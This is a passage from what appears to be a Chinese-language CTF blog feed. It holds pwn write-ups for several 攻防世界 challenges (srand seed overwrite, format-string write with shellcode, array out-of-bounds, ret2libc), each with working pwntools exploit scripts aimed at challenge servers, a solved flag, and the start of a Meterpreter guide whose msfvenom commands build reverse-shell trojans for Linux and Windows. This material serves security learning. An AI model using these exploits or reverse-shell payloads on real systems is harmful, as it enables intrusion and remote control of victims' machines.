[rbp-70h]</span><br>  FILE *stream; <span class="hljs-comment">// [rsp+78h] [rbp-8h]</span><br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">"Congrats %s\n"</span>, a1);<br>  stream = <span class="hljs-built_in">fopen</span>(<span class="hljs-string">"flag"</span>, <span class="hljs-string">"r"</span>);<br>  <span class="hljs-built_in">fgets</span>(&amp;s, <span class="hljs-number">100</span>, stream);<br>  <span class="hljs-built_in">puts</span>(&amp;s);<br>  <span class="hljs-keyword">return</span> <span class="hljs-built_in">fflush</span>(stdout);<br>}<br></code></pre></td></tr></tbody></table></figure><p>在输入name时，令输入数据覆盖srand函数内部随机种子，就可以控制随机数的生成。</p><p><img src="https://i.loli.net/2020/07/23/fxEhB6bCWcH9enR.png" alt="相差40.PNG"></p><p>随机树种子地址与输入名字的buf地址之间相差0x40,所以将seed覆盖掉</p><h2 id="0x03-exp"><a href="#0x03-exp" class="headerlink" title="0x03 exp"></a>0x03 exp</h2><figure class="highlight routeros"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-keyword">from</span> pwn import *<br><span class="hljs-keyword">from</span> ctypes import *<br><span class="hljs-attribute">p</span>=remote('220.249.52.133',34691)<br><span class="hljs-attribute">libc</span>=cdll.LoadLibrary("libc.so.6")<br>p.recv()<br><span class="hljs-attribute">payload</span>=0x40*'a'+p64(0)<br>p.sendline(payload)<br>a=[]<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(50):<br>    a.append(libc.rand()%6+1)<br><span class="hljs-built_in">print</span>(a)<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> a:<br>    p.recv()<br>    <span class="hljs-built_in">print</span>(p.recv())<br>    p.sendline(str(i))<br>p.interactive()<br></code></pre></td></tr></tbody></table></figure>]]></content>
    
    
    
    <tags>
      
      <tag>ctf</tag>
      
      <tag>pwn</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>攻防世界 string</title>
    <link href="/2022/08/09/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cpwn-string/"/>
    <url>/2022/08/09/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cpwn-string/</url>
    
    <content type="html"><![CDATA[<p>checksec 查看保护机制</p><p><img src="https://i.loli.net/2020/05/08/lbkP9F8xrwtuTWC.png" alt="捕获.PNG"></p><p>注：开启Full RELRO，无法修改got表；开启Canary found，不能直接用溢出方法覆盖栈中返回地址，要通过改写指针与局部变量、leak canary、overwrite canary的方法来绕过；开启NX,意味着栈中数据没有执行权限；PIE未开启，基地址不会变化，为0x400000.</p><h3 id="思路分析"><a href="#思路分析" class="headerlink" title="思路分析"></a>思路分析</h3><p>IDA64查看，在sub_400CA6()中发现：v1被强制转换成函数指针类型。</p><p><img src="https://i.loli.net/2020/05/08/4sSQG3NBDWnR7Jw.png" alt="17627983-1901e053361f6609.png"></p><blockquote><p>注：<code> ((void (__fastcall *)(_QWORD, void *))v1)(0LL, v1);</code> 就是将v1强制转换为一个函数指针</p></blockquote><p>其满足条件为 a1==a1[1]，回溯发现，a1为函数sub_400D72()函数的参数，即，a1为v5.</p><p><img src="https://i.loli.net/2020/05/08/zpABrQvk81ThUoe.png" alt="17627983-161d0aad17e6e884.png"></p><p>可看出，v4=v5,且*v4=68;v4[1]=85;也就是说，a1=68,a1[1]=85.所以我们要修改a1值令a1=85</p><p>按流程分析：<br>在sub_400A7D()中，满足s1==“east”，则跳出函数。</p><p>在sub_400BB9()中发现格式化字符串漏洞（可以进行任意地址改写）</p><p><img src="https://i.loli.net/2020/05/08/DzEihSeIblU8uFA.png" alt="17627983-6cdde7e8a076f299.png"></p><p><code>printf(&amp;format, &amp;format);</code></p><p>通过此处可修改v4[0]值，现在需要确定v4[0]地址。在main()函数中，打印的secret[0]正是v5,即v4[0]地址。</p><h3 id="攻击思路"><a href="#攻击思路" class="headerlink" title="攻击思路"></a>攻击思路</h3><p>通过格式化字符串漏洞赋值a1为85，使if条件成真，执行我们传入的shellcode拿到shell。</p><blockquote><p>函数调用约定：linux_x64下，参数从左到右放入寄存器：RDI,RSI,RDX,ECX,R8,R9,当参数为7个以上时，前面6个与前面一样，但后面的以此从“右向左”放入栈中。</p></blockquote><blockquote><p>利用pwntools自带的shellcodecraft工具，生成amd64架构下的shellcode，拿到shell.</p></blockquote><blockquote><p>Pwntools  shellcraft模块：是shellcode的模块，包含一些生成shellcode的函数，子模块声明架构（如：shellcode.arm是ARm架构；shellcraft.amd64是AMD64架构；shellcraft.common是所有架构通用）</p></blockquote><p><code>printf(shellcraft.sh())  #打印出shellcode</code><br><code>printf(asm(shellcraft.sh()))  #打印出汇编后的shellcode</code></p><p>用gdb调试程序，在printf下断点，输入%x测试，发现输出如图：</p><p><img src="https://i.loli.net/2020/05/08/pYcXRjQuOKesnf6.png" alt="17627983-fe71239050c56166.png"></p><p>填写address时我输入的是56（0x38），也就是[rsp+16]的位置，即格式化字符串的第7个参数（printf的第8个参数）</p><blockquote><p>conext.log_level=”debug”  脚本在执行时输出debug的信息，可以通过观察这些信息查找哪步出错</p></blockquote><p>补：<br>之前不知道sh.recv(7),16是什么意思，现在补充，就是sendline自带换行符，所以要把\n过滤掉，7是因为v3就是打印的6个书，换行符是第7位，16代表十六进制。</p><p><img src="https://i.loli.net/2020/05/08/b82ZR5pS9hPd4FK.png" alt="17627983-56395b2513720994.png"></p><p>exp：</p><figure class="highlight routeros"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-keyword">from</span> pwn import*<br> #<span class="hljs-attribute">sh</span>=process('./string')<br><span class="hljs-attribute">sh</span>=remote('111.198.29.45',36129)<br>context.<span class="hljs-attribute">log_level</span>=<span class="hljs-string">'debug'</span><br>sh.recvuntil(<span class="hljs-string">'secret[0] is'</span>)<br><span class="hljs-attribute">v3_addr</span>=int(sh.recv(7),16)<br>sh.recvuntil(<span class="hljs-string">'name be:'</span>)<br>sh.sendline(<span class="hljs-string">'zzz'</span>)<br>sh.recvuntil(<span class="hljs-string">'east or up?:'</span>)<br>sh.sendline(<span class="hljs-string">'east'</span>)<br>sh.recvuntil(<span class="hljs-string">'leave(0)?:'</span>)<br>sh.sendline(<span class="hljs-string">'1'</span>)<br>sh.recvuntil(<span class="hljs-string">'\'</span>Give me an address\<span class="hljs-string">''</span>)<br>sh.sendline(str(v3_addr))<br>sh.recvuntil(<span class="hljs-string">'you wish is:'</span>)<br><span class="hljs-attribute">payload</span>=<span class="hljs-string">'%085c'</span>+'%7$n'<br>sh.sendline(payload)<br>sh.recvuntil(<span class="hljs-string">'I will help you! USE YOU SPELL'</span>)<br>sh.sendline(asm(shellcraft.amd64.linux.sh(),<span class="hljs-attribute">arch</span>=<span class="hljs-string">"amd64"</span>))<br>sh.interactive()<br></code></pre></td></tr></tbody></table></figure><p>cyberpeace{962a040a22938025e2ad4bbe3e5b56d3}</p>]]></content>
    
    
    
    <tags>
      
      <tag>ctf</tag>
      
      <tag>pwn</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>攻防世界-pwn-stack2</title>
    <link href="/2022/08/09/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-pwn-stack2/"/>
    <url>/2022/08/09/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-pwn-stack2/</url>
    
    <content type="html"><![CDATA[<h2 id="0x01-分析"><a href="#0x01-分析" class="headerlink" title="0x01 分析"></a>0x01 分析</h2><p>checksec检查：</p><p><img src="https://i.loli.net/2020/07/27/seUw8f5zIvPk9W7.png" alt="捕获.PNG"></p><p>32位，无PIE，开了NX和canary.<br>运行一下是只有五个模块，展示数字，添加，更改，求平均数，退出。</p><p>IDA中查看main函数：</p><figure class="highlight cpp"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-function"><span class="hljs-type">int</span> __cdecl <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">const</span> <span class="hljs-type">char</span> **argv, <span class="hljs-type">const</span> <span class="hljs-type">char</span> **envp)</span></span><br><span class="hljs-function"></span>{<br>  <span class="hljs-type">int</span> v3; <span class="hljs-comment">// eax</span><br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> v5; <span class="hljs-comment">// [esp+18h] [ebp-90h]</span><br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> v6; <span class="hljs-comment">// [esp+1Ch] [ebp-8Ch]</span><br>  <span class="hljs-type">int</span> v7; <span class="hljs-comment">// [esp+20h] [ebp-88h]</span><br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> j; <span class="hljs-comment">// [esp+24h] [ebp-84h]</span><br>  <span class="hljs-type">int</span> v9; <span class="hljs-comment">// [esp+28h] [ebp-80h]</span><br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> i; <span class="hljs-comment">// [esp+2Ch] [ebp-7Ch]</span><br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> k; <span class="hljs-comment">// [esp+30h] [ebp-78h]</span><br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> l; <span class="hljs-comment">// [esp+34h] [ebp-74h]</span><br>  <span class="hljs-type">char</span> v13[<span class="hljs-number">100</span>]; <span class="hljs-comment">// [esp+38h] [ebp-70h]</span><br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> v14; <span class="hljs-comment">// [esp+9Ch] [ebp-Ch]</span><br>  v14 = __readgsdword(<span class="hljs-number">0x14</span>u);<br>  <span class="hljs-built_in">setvbuf</span>(stdin, <span class="hljs-number">0</span>, <span class="hljs-number">2</span>, <span class="hljs-number">0</span>);<br>  <span class="hljs-built_in">setvbuf</span>(stdout, <span class="hljs-number">0</span>, <span class="hljs-number">2</span>, <span class="hljs-number">0</span>);<br>  v9 = <span class="hljs-number">0</span>;<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">"***********************************************************"</span>);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">"*                      An easy calc                       *"</span>);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">"*Give me your numbers and I will return to you an average *"</span>);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">"*(0 &lt;= x &lt; 256)                                           *"</span>);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">"***********************************************************"</span>);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">"How many numbers you have:"</span>);<br>  __isoc99_scanf(<span class="hljs-string">"%d"</span>, &amp;v5);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">"Give me your numbers"</span>);<br>  <span class="hljs-keyword">for</span> ( i = <span class="hljs-number">0</span>; i &lt; v5 &amp;&amp; (<span class="hljs-type">signed</span> <span class="hljs-type">int</span>)i &lt;= <span class="hljs-number">0x63</span>; ++i )<br>  {<br>    __isoc99_scanf(<span class="hljs-string">"%d"</span>, &amp;v7);<br>    v13[i] = v7;<br>  }<br>  <span class="hljs-keyword">for</span> ( j = v5; ; <span class="hljs-built_in">printf</span>(<span class="hljs-string">"average is %.2lf\n"</span>, (<span class="hljs-type">double</span>)((<span class="hljs-type">long</span> <span class="hljs-type">double</span>)v9 / (<span class="hljs-type">double</span>)j)) )<br>  {<br>    <span class="hljs-keyword">while</span> ( <span class="hljs-number">1</span> )<br>    {<br>      <span class="hljs-keyword">while</span> ( <span class="hljs-number">1</span> )<br>      {<br>        <span class="hljs-keyword">while</span> ( <span class="hljs-number">1</span> )<br>        {<br>          <span class="hljs-built_in">puts</span>(<span class="hljs-string">"1. show numbers\n2. add number\n3. change number\n4. get average\n5. exit"</span>);<br>          __isoc99_scanf(<span class="hljs-string">"%d"</span>, &amp;v6);<br>          <span class="hljs-keyword">if</span> ( v6 != <span class="hljs-number">2</span> )<br>            <span class="hljs-keyword">break</span>;<br>          <span class="hljs-built_in">puts</span>(<span class="hljs-string">"Give me your number"</span>);<br>          __isoc99_scanf(<span class="hljs-string">"%d"</span>, &amp;v7);<br>          <span class="hljs-keyword">if</span> ( j &lt;= <span class="hljs-number">0x63</span> )<br>          {<br>            v3 = j++;<br>            v13[v3] = v7;<br>          }<br>        }<br>        <span class="hljs-keyword">if</span> ( v6 &gt; <span class="hljs-number">2</span> )<br>          <span class="hljs-keyword">break</span>;<br>        <span class="hljs-keyword">if</span> ( v6 != <span class="hljs-number">1</span> )<br>          <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>        <span class="hljs-built_in">puts</span>(<span class="hljs-string">"id\t\tnumber"</span>);<br>        <span class="hljs-keyword">for</span> ( k = <span class="hljs-number">0</span>; k &lt; j; ++k )<br>          <span class="hljs-built_in">printf</span>(<span class="hljs-string">"%d\t\t%d\n"</span>, k, v13[k]);<br>      }<br>      <span class="hljs-keyword">if</span> ( v6 != <span class="hljs-number">3</span> )<br>        <span class="hljs-keyword">break</span>;<br>      <span class="hljs-built_in">puts</span>(<span class="hljs-string">"which number to change:"</span>);<br>      __isoc99_scanf(<span class="hljs-string">"%d"</span>, &amp;v5);<br>      <span class="hljs-built_in">puts</span>(<span class="hljs-string">"new number:"</span>);<br>      __isoc99_scanf(<span class="hljs-string">"%d"</span>, &amp;v7);<br>      v13[v5] = v7;<br>    }<br>    <span class="hljs-keyword">if</span> ( v6 != <span class="hljs-number">4</span> )<br>      <span class="hljs-keyword">break</span>;<br>    v9 = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">for</span> ( l = <span class="hljs-number">0</span>; l &lt; j; ++l )<br>      v9 += v13[l];<br>  }<br>  <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>}<br></code></pre></td></tr></tbody></table></figure><p>发现没有检查v13数组边界，当选择3.change number时程序没有对v5进行检测，存在数组越界，产生溢出：</p><figure class="highlight armasm"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs armasm"><span class="hljs-symbol">puts</span>(<span class="hljs-string">"which number to change:"</span>)<span class="hljs-comment">;</span><br>     __isoc99_scanf(<span class="hljs-string">"%d"</span>, &amp;<span class="hljs-built_in">v5</span>)<span class="hljs-comment">;</span><br>     puts(<span class="hljs-string">"new number:"</span>)<span class="hljs-comment">;</span><br>     __isoc99_scanf(<span class="hljs-string">"%d"</span>, &amp;<span class="hljs-built_in">v7</span>)<span class="hljs-comment">;</span><br>     v13[<span class="hljs-built_in">v5</span>] = <span class="hljs-built_in">v7</span><span class="hljs-comment">;</span><br></code></pre></td></tr></tbody></table></figure><p>发现给了/bin/bash:</p><figure class="highlight x86asm"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs x86asm">:0804859B <span class="hljs-comment">; __unwind {</span><br><span class="hljs-symbol">.text:</span>0804859B                 <span class="hljs-keyword">push</span>    <span class="hljs-built_in">ebp</span><br><span class="hljs-symbol">.text:</span>0804859C                 <span class="hljs-keyword">mov</span>     <span class="hljs-built_in">ebp</span>, <span class="hljs-built_in">esp</span><br><span class="hljs-symbol">.text:</span>0804859E                 <span class="hljs-keyword">sub</span>     <span class="hljs-built_in">esp</span>, <span class="hljs-number">18h</span><br><span class="hljs-symbol">.text:</span>080485A1                 <span class="hljs-keyword">mov</span>     <span class="hljs-built_in">eax</span>, large <span class="hljs-built_in">gs</span>:<span class="hljs-number">14h</span><br><span class="hljs-symbol">.text:</span>080485A7                 <span class="hljs-keyword">mov</span>     [<span class="hljs-built_in">ebp</span>+var_C], <span class="hljs-built_in">eax</span><br><span class="hljs-symbol">.text:</span>080485AA                 <span class="hljs-keyword">xor</span>     <span class="hljs-built_in">eax</span>, <span class="hljs-built_in">eax</span><br><span class="hljs-symbol">.text:</span>080485AC                 <span class="hljs-keyword">sub</span>     <span class="hljs-built_in">esp</span>, <span class="hljs-number">0Ch</span><br><span class="hljs-symbol">.text:</span>080485AF                 <span class="hljs-keyword">push</span>    offset command  <span class="hljs-comment">; "/bin/bash"</span><br><span class="hljs-symbol">.text:</span>080485B4                 <span class="hljs-keyword">call</span>    _system <span class="hljs-comment">;system</span><br><span class="hljs-symbol">.text:</span>080485B9                 <span class="hljs-keyword">add</span>     <span class="hljs-built_in">esp</span>, <span class="hljs-number">10h</span><br><span class="hljs-symbol">.text:</span>080485BC                 <span class="hljs-keyword">nop</span><br><span class="hljs-symbol">.text:</span>080485BD                 <span class="hljs-keyword">mov</span>     <span class="hljs-built_in">edx</span>, [<span class="hljs-built_in">ebp</span>+var_C]<br><span class="hljs-symbol">.text:</span>080485C0                 <span class="hljs-keyword">xor</span>     <span class="hljs-built_in">edx</span>, large <span class="hljs-built_in">gs</span>:<span class="hljs-number">14h</span><br><span class="hljs-symbol">.text:</span>080485C7                 <span class="hljs-keyword">jz</span>      short locret_80485CE<br><span class="hljs-symbol">.text:</span>080485C9                 <span class="hljs-keyword">call</span>    ___stack_chk_fail<br></code></pre></td></tr></tbody></table></figure><p>开启动态调试，在v13[v5]=v7处下断点，</p><p><img src="https://i.loli.net/2020/07/31/ClcWPX8p29JHxQk.png" alt="linux输入.PNG"></p><p>转到IDA界面，查看此地址，此时edx存入的即为输入的数字9，在栈中的位置是：</p><p><img src="https://i.loli.net/2020/07/31/j24baYfNMdlRrGD.png" alt="捕获.PNG"></p><p>得到了输入在栈中的位置，找到返回地址的位置覆盖掉就可以了。</p>]]></content>
    
    
    
    <tags>
      
      <tag>ctf</tag>
      
      <tag>pwn</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>攻防世界 level3</title>
    <link href="/2022/08/09/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-pwn-level3/"/>
    <url>/2022/08/09/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-pwn-level3/</url>
    
    <content type="html"><![CDATA[<p>这道题对于我来讲好难好难啊，涉及到了很多新的知识。<br>首先checksec</p><p><img src="https://i.loli.net/2020/05/08/uFc1bxINidnvHVl.png" alt="17627983-3b321a2edea9a331.png"></p><p>:可以直接栈溢出；基地址不变化；对数据有执行权限。</p><p>查看main()函数：</p><p><img src="https://i.loli.net/2020/05/08/eFk7XyEv6ZKtGxd.png" alt="17627983-fde84f52ba2311ab.png"></p><p>查看函数function()：</p><p><img src="https://i.loli.net/2020/05/08/doMwxehS3tCsbFq.png" alt="捕获.PNG"></p><p>无system,无/bin/sh，给了一个共享文件libc_32.so.6,明显为ret2libc。</p><blockquote><p>ret2libc (return-into-libc)是一种利用缓冲区溢出的代码复用技术，主要通过覆盖栈帧的返回地址（EIP），使其返回到系统中的库函数，利用库函数中已有的功能来实施attack，而不是直接定位到注入的shellcode。system函数属于libc，而libc.so动态链接库中的函数之间相对偏移是固定的。即使程序有ASLR保护，也只是针对于地址中间位进行随机，最低的12位并不会发生改变，用工具来找到对应的libc文件。</p></blockquote><blockquote><p>ret2libc特征：1、没有/bin/sh；2、没有system和/bin/sh；3、无system和/bin/sh，但是给了libc.so文件；4、这三个全都没有。</p></blockquote><blockquote><p>ASLR：地址空间布局随机化，ios,android,windows,macos,linux的当前版本都具有ASLR保护。主要用于防止缓冲区溢出攻击，ASLR与虚拟内存管理一起工作，将程序的不同部分的位置随机化，令攻击者不能通过尝试和错误了解目标位置，因为地址将不同。</p></blockquote><p>read()函数中，buf大小为0x88，但是在函数中竟然规定了256之大。明显的栈溢出。</p><h3 id="攻击思路"><a href="#攻击思路" class="headerlink" title="攻击思路"></a>攻击思路</h3><p>libc内的地址是随机的，但是函数的相对地址是不变的，只要知道其中某一个函数的地址，再利用相对位移计算出我们所需要的函数的地址，如果知道read或write函数的地址就可以计算出其他函数的地址。</p><p>某大佬攻击思路：</p><p>（1）通过function()中的read构造栈溢出，并且覆写返回地址为plt中的write地址。（2）通过wirte泄露read在内存中的绝对地址，并且接着调用function()（注：got中的read保存着read在内存中的真实地址）（3）计算出system和/bin/sh的绝对地址，再通过function构造栈溢出进行覆写。（4）成功</p><blockquote><p>plt：procedure Linkage Table，延迟绑定，函数第一次用到时才进行绑定（符号查找，重定位等）；<br>实现手法：增加一层间接跳转。<br>调用函数时并不直接通过GOT跳转，而是通过一个叫做PLT的项的结构来进行跳转，每个外部函数在PLT中都有一个相应的项。<br>ELF将GOT拆分成两个表叫做.got和.got.plt。<br>.got用来保存全局变量引用的地址<br>.got.plt用来保存函数引用的地址，外部函数的引用全部放到 .plt.got中。</p></blockquote><p><strong>思路</strong> </p><p>通过read覆盖返回地址没执行两次main函数，第一次泄露write函数的地址，第二次执行system函数。</p><p>exp:</p><figure class="highlight pgsql"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span>*<br>p=remote(<span class="hljs-string">'111.198.29.45'</span>,<span class="hljs-number">52277</span>)<br> # p=process("./level3")<br> # 获取文件对象<br>elf=ELF(<span class="hljs-string">'./level3'</span>)<br> #获取lib库对象<br>libc=ELF(<span class="hljs-string">'./libc_32.so.6'</span>)<br> #获取函数<br>wirte_plt=elf.plt[<span class="hljs-string">'write'</span>]<br>write_got=elf.got[writ<span class="hljs-string">e']</span><br><span class="hljs-string">main_addr=elf.sym['</span>main<span class="hljs-string">']</span><br><span class="hljs-string"> #接受数据</span><br><span class="hljs-string">p.recvuntil(":\n")</span><br><span class="hljs-string">  #char[88],ebp write函数地址，write函数返回地址（返回到main函数） write函数参数一（1）  write函数参数二（write_got的地址）write参数三（写4字节）</span><br><span class="hljs-string">payload=0x88*'</span>a<span class="hljs-string">'+p32(0xdeadbeef)+p32(write_plt)+p32(main_addr)+p32(1)+p32(write_got)+p32(4)</span><br><span class="hljs-string">p.sendline(payload)</span><br><span class="hljs-string"> #获取wirte在got中的地址</span><br><span class="hljs-string">write_got_addr=u32(p.recv())</span><br><span class="hljs-string">print hex(write_got_addr)</span><br><span class="hljs-string"> # 计算lib库加载基址</span><br><span class="hljs-string">libc_base=write_got_addr-libc.sym['</span>writ<span class="hljs-string">e']</span><br><span class="hljs-string">print hex(libc_base)</span><br><span class="hljs-string"> # 计算system的地址</span><br><span class="hljs-string">system_addr=libc_base+libc.sym['</span><span class="hljs-keyword">system</span><span class="hljs-string">']</span><br><span class="hljs-string">print hex(bin_sh_addr)</span><br><span class="hljs-string"> #计算字符串/bin/sh 的地址。0x15902b为偏移，通过命令：strings -a -t x libc_32.so.6 | grep "/bin/sh"获取</span><br><span class="hljs-string">bin_sh_addr=libc_base+0x15902b</span><br><span class="hljs-string">print hex(bin_sh_addr)</span><br><span class="hljs-string"> #char [88] ebp system system函数的返回地址 system函数的参数(bin_sh_addr)</span><br><span class="hljs-string">payload2=0x88*'</span>a<span class="hljs-string">'+p32(0xdeadbeef)+p32(system_addr)+p32(0x11111111)+p32(bin_sh_addr)</span><br><span class="hljs-string"> #接受数据</span><br><span class="hljs-string">p.recvuntil(":\n")</span><br><span class="hljs-string"> #发送payloas</span><br><span class="hljs-string">p.sendline(payload2)</span><br><span class="hljs-string"> #切换交互模式</span><br><span class="hljs-string">p.interactive()</span><br></code></pre></td></tr></tbody></table></figure>]]></content>
    
    
    
    <tags>
      
      <tag>ctf</tag>
      
      <tag>pwn</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>初识Meterpreter</title>
    <link href="/2022/08/09/%E5%88%9D%E8%AF%86Meterpreter/"/>
    <url>/2022/08/09/%E5%88%9D%E8%AF%86Meterpreter/</url>
    
    <content type="html"><![CDATA[<h2 id="什么是Meterpreter"><a href="#什么是Meterpreter" class="headerlink" title="什么是Meterpreter"></a>什么是Meterpreter</h2><p>metrepreter 是metasploit框架中的一个扩展模块，作为溢出成功以后的攻击载荷使用，攻击载荷在溢出攻击成功以后给我们返回一个控制通道，使用它作为攻击载荷能够获得目标系统的一个meterpreter shell的链接。</p><blockquote><p>meterpreter shell作为渗透模块有很多有用的功能，如：添加用户、隐藏、打开shell、得到用户密码、上传下载远程主机文件、运行cmd、得到远程控制权、捕获按键信息、清除应用程序、显示远程主机的系统信息 网络接口 ip地址等信息。<br>Meterpreter能够躲避入侵检测系统，在远程主机上隐藏自己，不改变系统硬盘中的文件<br>Meterpreter 是一种后渗透工具，属于一种在运行过程中可通过网络进行功能扩展的动态可扩展型payload，此工具基于内存DLL注入理念实现，通过创建一个新进程并调用注入的DLL来让目标系统运行注入的DLL文件。攻击者与目标设备中Meterpreter的通信是通过Stager套接字实现。</p></blockquote><h2 id="Meterpreter中常用反弹类型"><a href="#Meterpreter中常用反弹类型" class="headerlink" title="Meterpreter中常用反弹类型"></a>Meterpreter中常用反弹类型</h2><h3 id="1-reverse-tcp"><a href="#1-reverse-tcp" class="headerlink" title="1.reverse_tcp"></a>1.reverse_tcp</h3><p>基于TCP的反向链接反弹shell，使用稳定。</p><ul><li><p>Linux:</p><ul><li>linux下反弹shell木马：</li><li><code>msfvenom -p linux/x86/meterpreter/reverse_tcp lhost=[ip] lport=4444 -f elf -o shell</code></li><li>目录下生成木马文件isshell，为文件加可执行权限，打开metasploit，使用模块handler设置payload(与生成木马所使用payload一致)</li><li>设置地址和端口，开始监听。</li><li>运行反弹shell木马，成功反弹回shell</li></ul></li><li><p>Windows:</p><ul><li><code>msfvenom -p windows/meterpreter/reverse_tcp lhost=[你的ip] lport=[端口] -f exe -o [要生成的文件名]</code></li><li><code>msfvenom -p windows/meterpreter/reverse_tcp lhost=[ip] lport=4444 -f exe -o shell.exe</code></li></ul></li></ul><h3 id="2-reverse-http"><a href="#2-reverse-http" class="headerlink" title="2.reverse_http"></a>2.reverse_http</h3><p>基于http方式的反向连接，网速慢的情况下不稳定。</p><p><code>payload: /windows/meterpreter/reverse_http</code></p><h3 id="3-reverse-https"><a href="#3-reverse-https" class="headerlink" title="3.reverse_https"></a>3.reverse_https</h3><p>基于https方式的反向连接，网速慢的情况下不稳定，https若反弹没收到数据，可以将监听端口换成443试试。</p><p><code>payload: /windows/meterpreter/reverse_https</code></p><h3 id="4-bind-tcp"><a href="#4-bind-tcp" class="headerlink" 